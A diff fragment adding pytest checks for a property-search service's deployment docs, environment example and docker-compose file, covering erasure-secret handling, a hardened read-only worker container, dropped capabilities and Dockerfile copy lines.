+        .split("## Disposable development and test targets\n", 1)[0]
+        .split()
+    )
+
+    for required in (
+        "Writer contract 3 and schema v11 are deliberately not rolling-compatible",
+        "PROPERTYQUARRY_PROPERTY_SEARCH_ERASURE_SECRET",
+        "property_search_erasure_key_mismatch",
+        "stop every API, worker, scheduler, and render/publication writer",
+        "From live schema v9 this applies v10 and v11 in the same migration transaction",
+        "homogeneous schema-v11/contract-3 fleet",
+        "fresh per-instance heartbeats for the complete expected role manifest",
+        "never restart a contract-2 binary after v11",
+        "Changing the erasure secret is a separately designed key migration",
+    ):
+        assert required in cutover
+
+    env_example = _read(".env.example")
+    assert "PROPERTYQUARRY_PROPERTY_SEARCH_ERASURE_SECRET=" in env_example
+    assert "Do not rotate it without a governed database key migration" in env_example
+
+
 def test_environment_matrix_separates_local_compose_from_production_handoff() -> None:
     matrix = _read("ENVIRONMENT_MATRIX.md")
 
@@ -1792,6 +2577,29 @@ def test_property_security_posture_accepts_pinned_multistage_scratch_runtimes() 
     receipt = property_security_posture.build_security_posture_receipt()
     assert receipt["status"] == "pass"
     assert receipt["failures"] == []
+
+
+def test_property_security_posture_requires_hardened_durable_worker(
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    def make_worker_generic(compose: str) -> str:
+        marker = 'PROPERTYQUARRY_WORKER_PROFILE: "property_only"'
+        assert compose.count(marker) == 1
+        return compose.replace(
+            marker,
+            'PROPERTYQUARRY_WORKER_PROFILE: "generic"',
+            1,
+        )
+
+    failures = _security_posture_failures_with_file_mutation(
+        monkeypatch,
+        path="docker-compose.property.yml",
+        mutate=make_worker_generic,
+    )
+
+    assert failures == [
+        "docker-compose.property.yml must keep a hardened property-only durable worker"
+    ]
 
 
 def test_property_security_posture_checks_every_non_scratch_stage_digest(
@@ -2141,13 +2949,16 @@ def test_property_web_services_keep_the_fixed_image_identity_and_entrypoint() ->
         "  propertyquarry-migrate:\n", 1
     )[0]
     migrate = compose.split("  propertyquarry-migrate:\n", 1)[1].split(
+        "  propertyquarry-worker:\n", 1
+    )[0]
+    worker = compose.split("  propertyquarry-worker:\n", 1)[1].split(
         "  propertyquarry-scheduler:\n", 1
     )[0]
     scheduler = compose.split("  propertyquarry-scheduler:\n", 1)[1].split(
         "  propertyquarry-render-tools:\n", 1
     )[0]
 
-    for section in (api, migrate, scheduler):
+    for section in (api, migrate, worker, scheduler):
         assert re.search(r"^    (?:user|entrypoint):", section, flags=re.MULTILINE) is None
         assert "/var/run/docker.sock" not in section
         assert "\n    cap_drop:\n      - ALL\n" in section
@@ -2161,6 +2972,8 @@ def test_property_web_services_keep_the_fixed_image_identity_and_entrypoint() ->
         '"app.product.property_search_schema", "migrate"]'
         in migrate
     )
+    assert "\n    command:" not in worker
+    assert "\n    read_only: true\n" in worker
     assert "\n    command:" not in scheduler
 
 
@@ -2179,6 +2992,20 @@ def test_property_runtime_copied_scripts_do_not_depend_on_fleet_paths() -> None:
         assert "/docker/fleet" not in body, script_name
         assert "/tmp/propertyquarry" not in body, script_name
 
+    for required_runtime_copy in (
+        "COPY --chmod=0444 ea/app/__init__.py /app/ea/app/__init__.py",
+        "COPY --chmod=0444 ea/app/observability.py /app/ea/app/observability.py",
+        (
+            "COPY --chmod=0444 ea/app/services/__init__.py "
+            "/app/ea/app/services/__init__.py"
+        ),
+        (
+            "COPY --chmod=0444 ea/app/services/admission_control.py "
+            "/app/ea/app/services/admission_control.py"
+        ),
+    ):
+        assert required_runtime_copy in dockerfile
+
 
 def test_property_compose_container_names_are_recoverable() -> None:
     compose = _read("docker-compose.property.yml")
@@ -2192,24 +3019,44 @@ def test_property_compose_container_names_are_recoverable() -> None:
     assert "dockerfile: ea/Dockerfile.property" in compose
     assert 'image: "${PROPERTYQUARRY_RENDER_IMAGE:-propertyquarry-render-runtime:latest}"' in compose
     assert 'container_name: "${PROPERTYQUARRY_API_CONTAINER_NAME:-propertyquarry-api}"' in compose
+    assert 'container_name: "${PROPERTYQUARRY_WORKER_CONTAINER_NAME:-propertyquarry-worker}"' in compose
     assert 'container_name: "${PROPERTYQUARRY_SCHEDULER_CONTAINER_NAME:-propertyquarry-scheduler}"' in compose
     assert 'container_name: "${PROPERTYQUARRY_DB_CONTAINER_NAME:-propertyquarry-db-live}"' in compose
     assert 'container_name: "${PROPERTYQUARRY_RENDER_CONTAINER_NAME:-propertyquarry-render-tools}"' in compose
     assert compose.count("path: ./state/runtime/property_scene_video_shared.env") == 2
+    assert compose.count(
+        'PROPERTYQUARRY_PROPERTY_SEARCH_ERASURE_SECRET: "${PROPERTYQUARRY_PROPERTY_SEARCH_ERASURE_SECRET:-}"'
+    ) == 4
     migration_section = compose.split("  propertyquarry-migrate:", 1)[1].split(
-        "  propertyquarry-scheduler:", 1
+        "  propertyquarry-worker:", 1
     )[0]
+    assert "PROPERTYQUARRY_PROPERTY_SEARCH_ERASURE_SECRET" in migration_section
     assert "property_scene_video_shared.env" not in migration_section
     assert "env_file:" not in migration_section
     assert "EA_ROLE: property-search-migrate" in migration_section
     assert 'command: ["/usr/local/bin/python", "-m", "app.product.property_search_schema", "migrate"]' in migration_section
     assert 'restart: "no"' in migration_section
+    worker_section = compose.split("  propertyquarry-worker:", 1)[1].split(
+        "  propertyquarry-scheduler:", 1
+    )[0]
+    assert "PROPERTYQUARRY_PROPERTY_SEARCH_ERASURE_SECRET" in worker_section
+    assert "EA_ROLE: worker" in worker_section
+    assert 'EA_STORAGE_BACKEND: "postgres"' in worker_section
+    assert 'PROPERTYQUARRY_WORKER_PROFILE: "property_only"' in worker_section
+    assert "property_scene_video_shared.env" not in worker_section
+    assert "propertyquarry_render_internal" not in worker_section
+    assert "read_only: true" in worker_section
+    assert "propertyquarry_artifacts:/data/artifacts" in worker_section
     assert "EA_SCHEDULER_HEARTBEAT_PATH: /data/artifacts/propertyquarry-scheduler-heartbeat.json" in compose
     assert 'EA_SCHEDULER_HEARTBEAT_MAX_AGE_SECONDS: "${EA_SCHEDULER_HEARTBEAT_MAX_AGE_SECONDS:-900}"' in compose
     assert 'test: ["CMD", "/usr/local/bin/python", "-m", "app.scheduler_healthcheck"]' in compose
     scheduler_section = compose.split("  propertyquarry-scheduler:", 1)[1].split("  propertyquarry-db:", 1)[0]
+    assert "PROPERTYQUARRY_PROPERTY_SEARCH_ERASURE_SECRET" in scheduler_section
     assert "disable: true" not in scheduler_section
     render_section = compose.split("  propertyquarry-render-tools:", 1)[1].split("  propertyquarry-db:", 1)[0]
+    assert "PROPERTYQUARRY_PROPERTY_SEARCH_ERASURE_SECRET" not in render_section
+    assert "PROPERTYQUARRY_RENDER_DATABASE_URL:?Set a least-privilege" in render_section
+    assert "${DATABASE_URL:-postgresql://postgres:" not in render_section
     assert "profiles:" not in render_section
     assert "- render-tools" not in render_section
     assert (
